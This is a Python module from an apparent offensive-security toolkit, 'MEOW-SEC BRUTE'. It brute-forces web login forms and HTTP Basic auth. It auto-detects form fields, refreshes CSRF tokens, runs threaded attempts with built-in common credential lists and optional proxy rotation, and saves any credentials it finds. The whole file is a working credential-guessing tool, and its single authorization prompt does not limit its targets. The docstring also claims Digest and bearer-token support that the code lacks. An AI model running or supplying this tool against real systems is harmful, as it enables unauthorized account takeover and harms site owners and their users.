# -*- coding: utf-8 -*-
"""
MEOW-SEC :: BRUTE — HTTP Login Brute Force
  · Form-based POST brute force (auto-detect login fields)
  · HTTP Basic / Digest auth brute force
  · Bearer token wordlist
  · Built-in credentials + custom wordlist
  · Proxy rotation + delay + thread control
"""
import os, re, time, json, threading
import concurrent.futures
from datetime import datetime
from urllib.parse import urlparse, urlencode

from core.ui import (console, ok, err, info, warn, find, ask_choice,
                     show_module_banner, G1, G2, CY, OR, RD, DM)
from core.cats import cat_talk, CAT_SCAN, CAT_PWNED
from rich.panel   import Panel
from rich.table   import Table
from rich.prompt  import Prompt, IntPrompt, Confirm
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, MofNCompleteColumn, TimeElapsedColumn
from rich         import box
from rich.rule    import Rule

try:
    import requests
    requests.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ─── BUILT-IN WORDLISTS ──────────────────────────────────────

USERS = [
    "admin","administrator","root","user","test","guest","info","manager",
    "support","operator","sa","webmaster","postmaster","hostmaster",
    "www","ftp","mail","mysql","oracle","postgres","ubuntu","debian",
    "pi","ec2-user","vagrant","deploy","backup","dev","demo","api",
]

PASSWORDS = [
    "admin","password","123456","password1","12345678","qwerty","admin123",
    "letmein","welcome","monkey","dragon","master","1234567","abc123",
    "111111","sunshine","iloveyou","password123","root","toor","test",
    "guest","default","changeme","secret","pass","p@ssw0rd","Pa$$w0rd",
    "Admin123!","Welcome1","admin@123","admin1234","Administrator",
    "P@ssword1","1q2w3e4r","admin2024","admin2025","qwerty123",
    "123456789","0000","1234","654321","password2","admin!","test123",
    "demo","demo123","login","pass123","user","user123",
]

# ─── FORM DETECTION ──────────────────────────────────────────

def _detect_form(url: str, session) -> dict:
    """Détecte les champs username/password + action + CSRF token dans un formulaire HTML"""
    try:
        r = session.get(url, timeout=10, verify=False,
                        headers={"User-Agent": "Mozilla/5.0"})
        html = r.text

        # Trouver le formulaire
        form_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.I)
        action = form_action.group(1) if form_action else url

        # Champs input
        inputs = re.findall(r'<input[^>]+>', html, re.I)
        fields = {}
        for inp in inputs:
            name  = re.search(r'name=["\']([^"\']+)["\']', inp, re.I)
            itype = re.search(r'type=["\']([^"\']+)["\']', inp, re.I)
            val   = re.search(r'value=["\']([^"\']*)["\']', inp, re.I)
            if not name: continue
            n = name.group(1)
            t = itype.group(1).lower() if itype else "text"
            v = val.group(1) if val else ""
            fields[n] = {"type": t, "value": v}

        # Identifier champs user/pass
        user_field = None
        pass_field = None
        csrf_field = None
        csrf_value = None

        for fname, fdata in fields.items():
            fl = fname.lower()
            if fdata["type"] == "password":
                pass_field = fname
            elif any(k in fl for k in ("user","login","email","mail","name","usr")):
                user_field = fname
            elif any(k in fl for k in ("csrf","token","_token","nonce","authenticity")):
                csrf_field = fname
                csrf_value = fdata["value"]

        # Si pas trouvé par type, prendre le premier text
        if not user_field:
            for fname, fdata in fields.items():
                if fdata["type"] in ("text","email") and fname != csrf_field:
                    user_field = fname; break

        return {
            "action":      action if action.startswith("http") else url.rstrip("/") + "/" + action.lstrip("/"),
            "user_field":  user_field,
            "pass_field":  pass_field,
            "csrf_field":  csrf_field,
            "csrf_value":  csrf_value,
            "all_fields":  fields,
            "cookies":     dict(r.cookies),
        }
    except Exception as e:
        return {"error": str(e)}

def _get_csrf(url: str, session, csrf_field: str) -> str | None:
    """Récupère un CSRF token frais avant chaque tentative"""
    try:
        r = session.get(url, timeout=8, verify=False)
        m = re.search(rf'name=["\']({re.escape(csrf_field)})["\'][^>]*value=["\']([^"\']*)["\']', r.text, re.I)
        if m: return m.group(2)
        m = re.search(rf'value=["\']([^"\']*)["\'][^>]*name=["\']({re.escape(csrf_field)})["\']', r.text, re.I)
        if m: return m.group(1)
    except Exception:
        pass
    return None

# ─── BRUTE ENGINES ───────────────────────────────────────────

def _check_form(session, action: str, login_url: str,
                user_field: str, pass_field: str,
                username: str, password: str,
                extra_fields: dict, csrf_field: str | None,
                fail_strings: list, success_strings: list,
                delay: float) -> dict:
    """Une tentative de login form"""
    data = {**extra_fields, user_field: username, pass_field: password}
    if csrf_field:
        token = _get_csrf(login_url, session, csrf_field)
        if token:
            data[csrf_field] = token

    time.sleep(delay)
    try:
        r = session.post(action, data=data, timeout=12, verify=False,
                         allow_redirects=True,
                         headers={"User-Agent": "Mozilla/5.0",
                                  "Referer": login_url,
                                  "Content-Type": "application/x-www-form-urlencoded"})
        body = r.text.lower()

        # Indicateurs d'échec
        for fs in fail_strings:
            if fs.lower() in body:
                return {"success": False, "user": username, "pass": password,
                        "status": r.status_code}

        # Indicateurs de succès
        for ss in success_strings:
            if ss.lower() in body:
                return {"success": True, "user": username, "pass": password,
                        "status": r.status_code}

        # Heuristiques: redirect après login = succès probable
        if r.history and r.status_code == 200 and len(r.history) > 0:
            orig_url = login_url.rstrip("/")
            if orig_url not in r.url:
                return {"success": True, "user": username, "pass": password,
                        "status": r.status_code, "note": "redirect"}

        return {"success": False, "user": username, "pass": password,
                "status": r.status_code}
    except Exception as e:
        return {"success": False, "user": username, "pass": password,
                "status": 0, "error": str(e)}

def _check_basic(url: str, username: str, password: str, delay: float) -> dict:
    time.sleep(delay)
    try:
        r = requests.get(url, auth=(username, password), timeout=8,
                         verify=False, allow_redirects=False)
        success = r.status_code not in (401, 403)
        return {"success": success, "user": username, "pass": password,
                "status": r.status_code}
    except Exception as e:
        return {"success": False, "user": username, "pass": password,
                "status": 0}

# ─── MAIN ────────────────────────────────────────────────────

def run():
    show_module_banner("brute")
    cat_talk(CAT_SCAN, "HTTP brute force engine loaded.", OR)
    console.print()
    warn("Use ONLY on systems you own or have explicit written permission to test.")
    console.print()
    if not Confirm.ask(f"  [{OR}]◈ Authorized target confirmed?[/]", default=False):
        info("Aborted."); return

    if not HAS_REQUESTS:
        err("requests library required."); return

    console.print()
    while True:
        console.print(f"  [{G1}][1][/] Form brute force   (POST login)")
        console.print(f"  [{G1}][2][/] HTTP Basic auth    (Authorization header)")
        console.print(f"  [{G1}][3][/] Credential check   (single user:pass test)")
        console.print(f"  [{G1}][0][/] Back")
        console.print()
        choice = ask_choice("BRUTE", "0")
        if choice == "0": break
        elif choice == "1": _form_brute()
        elif choice == "2": _basic_brute()
        elif choice == "3": _single_check()
        console.print()

def _form_brute():
    console.print(Rule(f"[{G1}] FORM BRUTE FORCE ", style=G2))
    url = Prompt.ask(f"  [{G1}]◈ Login URL[/]").strip()
    if not url: return
    if "://" not in url: url = "https://" + url

    session = requests.Session()
    info("Detecting login form fields...")
    form = _detect_form(url, session)
    if "error" in form:
        err(f"Form detection failed: {form['error']}"); return

    uf = form.get("user_field")
    pf = form.get("pass_field")
    if not uf or not pf:
        warn(f"Could not auto-detect fields. Found: {list(form.get('all_fields',{}).keys())}")
        uf = Prompt.ask(f"  [{G1}]◈ Username field name[/]", default="username").strip()
        pf = Prompt.ask(f"  [{G1}]◈ Password field name[/]", default="password").strip()
    else:
        ok(f"Detected: user=[{CY}]{uf}[/]  pass=[{CY}]{pf}[/]"
           + (f"  csrf=[{OR}]{form['csrf_field']}[/]" if form.get("csrf_field") else ""))

    action = form.get("action", url)

    # Champs cachés supplémentaires
    extra = {k: v["value"] for k, v in form.get("all_fields",{}).items()
             if v["type"] in ("hidden",) and k not in (uf, pf, form.get("csrf_field",""))}

    # Fail/success strings
    fail_str  = ["invalid","incorrect","wrong","failed","error","denied",
                 "invalid password","bad credentials","unauthorized"]
    succ_str  = ["dashboard","logout","welcome","signed in","logged in","my account"]
    console.print(f"  [{DM}]Fail strings (auto): {', '.join(fail_str[:4])}...[/]")
    custom_fail = Prompt.ask(f"  [{G1}]◈ Add fail string (or ENTER)[/]", default="").strip()
    if custom_fail: fail_str.append(custom_fail)

    # Wordlists
    users, passwords = _load_wordlists()

    # Config
    threads = IntPrompt.ask(f"  [{G1}]◈ Threads[/]", default=5)
    delay   = float(Prompt.ask(f"  [{G1}]◈ Delay between requests (s)[/]", default="0.1"))

    # Proxy
    proxy = None
    if Confirm.ask(f"  [{OR}]◈ Use proxy rotation?[/]", default=False):
        try:
            from core.proxy_manager import get_manager
            proxy = get_manager().get_dict()
        except: pass

    if proxy:
        session.proxies = proxy

    pairs = [(u, p) for u in users for p in passwords]
    info(f"Testing [{G1}]{len(pairs):,}[/] combinations  "
         f"({len(users)} users × {len(passwords)} passwords)")
    console.print()

    found = []
    lock  = threading.Lock()
    stop  = threading.Event()

    def _try(args):
        if stop.is_set(): return None
        u, p = args
        res = _check_form(session, action, url, uf, pf, u, p,
                          extra, form.get("csrf_field"), fail_str, succ_str, delay)
        if res.get("success"):
            stop.set()
            with lock:
                found.append(res)
        return res

    with Progress(SpinnerColumn(style=G1),
                  TextColumn(f"[{G1}]Brute forcing"),
                  BarColumn(bar_width=35, style=G2, complete_style=G1),
                  MofNCompleteColumn(), TimeElapsedColumn(),
                  console=console) as prog:
        task = prog.add_task("", total=len(pairs))
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
            for res in pool.map(_try, pairs):
                if res: prog.advance(task)
                if stop.is_set(): break

    console.print()
    if found:
        cat_talk(CAT_PWNED, f"VALID CREDENTIALS: {found[0]['user']} / {found[0]['pass']}", G1)
        _save_creds(url, "form", found)
    else:
        warn("No valid credentials found.")

def _basic_brute():
    console.print(Rule(f"[{G1}] HTTP BASIC AUTH ", style=G2))
    url = Prompt.ask(f"  [{G1}]◈ URL (protected endpoint)[/]").strip()
    if not url: return
    if "://" not in url: url = "https://" + url

    # Vérifier que c'est bien du Basic auth
    try:
        r = requests.get(url, timeout=8, verify=False)
        if r.status_code != 401:
            warn(f"Server returned {r.status_code}, not 401 — may not use Basic auth")
        else:
            www_auth = r.headers.get("WWW-Authenticate","")
            ok(f"Auth required: [{CY}]{www_auth}[/]")
    except Exception as e:
        err(f"Request failed: {e}"); return

    users, passwords = _load_wordlists()
    delay   = float(Prompt.ask(f"  [{G1}]◈ Delay (s)[/]", default="0.05"))
    threads = IntPrompt.ask(f"  [{G1}]◈ Threads[/]", default=10)

    pairs = [(u, p) for u in users for p in passwords]
    info(f"Testing [{G1}]{len(pairs):,}[/] pairs...")
    console.print()

    found = []
    stop  = threading.Event()

    def _try(args):
        if stop.is_set(): return None
        u, p = args
        res = _check_basic(url, u, p, delay)
        if res.get("success"):
            stop.set()
            found.append(res)
        return res

    with Progress(SpinnerColumn(style=G1),
                  TextColumn(f"[{G1}]Basic auth brute"),
                  BarColumn(bar_width=35, style=G2, complete_style=G1),
                  MofNCompleteColumn(), TimeElapsedColumn(),
                  console=console) as prog:
        task = prog.add_task("", total=len(pairs))
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
            for res in pool.map(_try, pairs):
                if res: prog.advance(task)
                if stop.is_set(): break

    console.print()
    if found:
        cat_talk(CAT_PWNED, f"VALID: {found[0]['user']} / {found[0]['pass']}", G1)
        _save_creds(url, "basic", found)
    else:
        warn("No valid credentials found.")

def _single_check():
    console.print(Rule(f"[{G1}] SINGLE CREDENTIAL TEST ", style=G2))
    url  = Prompt.ask(f"  [{G1}]◈ URL[/]").strip()
    user = Prompt.ask(f"  [{G1}]◈ Username[/]").strip()
    pwd  = Prompt.ask(f"  [{G1}]◈ Password[/]").strip()
    mode = ask_choice("Type: [1] Form  [2] Basic", "1")
    if mode == "2":
        res = _check_basic(url, user, pwd, 0)
    else:
        session = requests.Session()
        form = _detect_form(url, session)
        uf = form.get("user_field","username")
        pf = form.get("pass_field","password")
        res = _check_form(session, form.get("action",url), url, uf, pf,
                          user, pwd, {}, form.get("csrf_field"), [], [], 0)
    if res.get("success"):
        find(f"VALID  {user} / {pwd}  (HTTP {res['status']})")
    else:
        warn(f"Invalid  (HTTP {res.get('status',0)})")

def _load_wordlists() -> tuple[list, list]:
    console.print(f"  [{G1}][1][/] Built-in users+passwords  ({len(USERS)}u × {len(PASSWORDS)}p)")
    console.print(f"  [{G1}][2][/] Custom username file")
    console.print(f"  [{G1}][3][/] Custom password file")
    console.print(f"  [{G1}][4][/] Both custom files")
    wl = ask_choice("Wordlists", "1")

    users     = list(USERS)
    passwords = list(PASSWORDS)

    if wl in ("2","4"):
        p = Prompt.ask(f"  [{G1}]◈ Username file[/]").strip()
        if os.path.exists(p):
            users = [l.strip() for l in open(p, encoding="utf-8", errors="ignore") if l.strip()]
    if wl in ("3","4"):
        p = Prompt.ask(f"  [{G1}]◈ Password file[/]").strip()
        if os.path.exists(p):
            passwords = [l.strip() for l in open(p, encoding="utf-8", errors="ignore") if l.strip()]

    return users, passwords

def _save_creds(url, method, found):
    os.makedirs("data", exist_ok=True)
    fname = f"data/brute_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(fname, "w") as f:
        json.dump({"url": url, "method": method, "found": found,
                   "timestamp": datetime.now().isoformat()}, f, indent=2)
    ok(f"Saved: {fname}")
